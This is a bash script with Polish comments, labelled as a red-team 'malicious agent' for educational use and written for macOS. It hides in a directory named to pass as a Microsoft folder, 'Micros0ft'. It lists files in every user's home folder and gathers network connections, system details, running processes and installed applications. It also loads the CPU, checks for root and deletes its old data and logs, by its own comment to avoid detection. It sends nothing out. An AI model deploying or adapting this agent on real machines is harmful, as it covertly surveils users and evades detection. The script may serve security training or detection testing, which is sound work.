#!/bin/bash

# Malicious Agent Script - RED TEAM
# Wykonuje złośliwe działania w tle
# ⚠️ TYLKO DO CELÓW EDUKACYJNYCH

AGENT_DIR="/Users/Shared/Micros0ft"
LOG_FILE="$AGENT_DIR/agent.log"
DATA_DIR="$AGENT_DIR/data"
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')

# Utwórz katalogi jeśli nie istnieją
mkdir -p "$AGENT_DIR" "$DATA_DIR" 2>/dev/null

# Funkcja logowania
log_message() {
    echo "[$TIMESTAMP] $1" >> "$LOG_FILE"
}

log_message "Agent uruchomiony (PID: $$)"

# 1. Zbieranie informacji o plikach i folderach użytkownika
collect_file_info() {
    log_message "Zbieranie informacji o plikach użytkownika..."
    
    # Lista użytkowników
    USERS_DIR="/Users"
    if [ -d "$USERS_DIR" ]; then
        for user_dir in "$USERS_DIR"/*; do
            if [ -d "$user_dir" ]; then
                username=$(basename "$user_dir")
                info_file="$DATA_DIR/user_${username}_files_$(date +%Y%m%d_%H%M%S).txt"
                
                # Zbierz informacje o plikach (tylko metadane, nie zawartość)
                find "$user_dir" -type f -maxdepth 3 -exec ls -lh {} \; 2>/dev/null | \
                    head -1000 > "$info_file" 2>/dev/null
                
                log_message "Zebrano informacje o plikach użytkownika: $username"
            fi
        done
    fi
}

# 2. Monitorowanie aktywności sieciowej
collect_network_info() {
    log_message "Zbieranie informacji o aktywności sieciowej..."
    
    network_file="$DATA_DIR/network_$(date +%Y%m%d_%H%M%S).txt"
    
    # Aktywne połączenia sieciowe
    netstat -an | grep ESTABLISHED > "$network_file" 2>/dev/null
    
    # Informacje o interfejsach sieciowych
    ifconfig >> "$network_file" 2>/dev/null
    
    # Informacje o routingu
    netstat -rn >> "$network_file" 2>/dev/null
    
    log_message "Zebrano informacje o aktywności sieciowej"
}

# 3. Zbieranie informacji o systemie
collect_system_info() {
    log_message "Zbieranie informacji o systemie..."
    
    system_file="$DATA_DIR/system_$(date +%Y%m%d_%H%M%S).txt"
    
    # Informacje o systemie
    uname -a > "$system_file" 2>/dev/null
    sw_vers >> "$system_file" 2>/dev/null
    
    # Lista procesów
    ps aux >> "$system_file" 2>/dev/null
    
    # Lista zainstalowanych aplikacji
    ls -la /Applications >> "$system_file" 2>/dev/null
    
    log_message "Zebrano informacje o systemie"
}

# 4. Obciążanie CPU (symulacja złośliwej aktywności)
cpu_stress() {
    log_message "Wykonywanie zadania obciążającego CPU..."
    
    # Krótkie obciążenie CPU (5 sekund)
    timeout 5 bash -c 'while true; do :; done' 2>/dev/null || \
    (end_time=$(($(date +%s) + 5)); while [ $(date +%s) -lt $end_time ]; do :; done)
    
    log_message "Zadanie obciążające CPU zakończone"
}

# 5. Sprawdzanie uprawnień i próba eskalacji
check_privileges() {
    if [ "$EUID" -eq 0 ]; then
        log_message "Agent działa z uprawnieniami root!"
    else
        log_message "Agent działa z uprawnieniami użytkownika: $(whoami)"
    fi
}

# Główna pętla wykonania
main() {
    log_message "=== Rozpoczęcie cyklu zbierania danych ==="
    
    check_privileges
    collect_system_info
    collect_file_info
    collect_network_info
    cpu_stress
    
    log_message "=== Zakończenie cyklu zbierania danych ==="
    
    # Usuń stare pliki (starsze niż 7 dni) aby uniknąć wykrycia
    find "$DATA_DIR" -type f -mtime +7 -delete 2>/dev/null
    find "$AGENT_DIR" -name "*.log" -mtime +7 -exec truncate -s 0 {} \; 2>/dev/null
}

# Wykonaj główną funkcję
main

exit 0

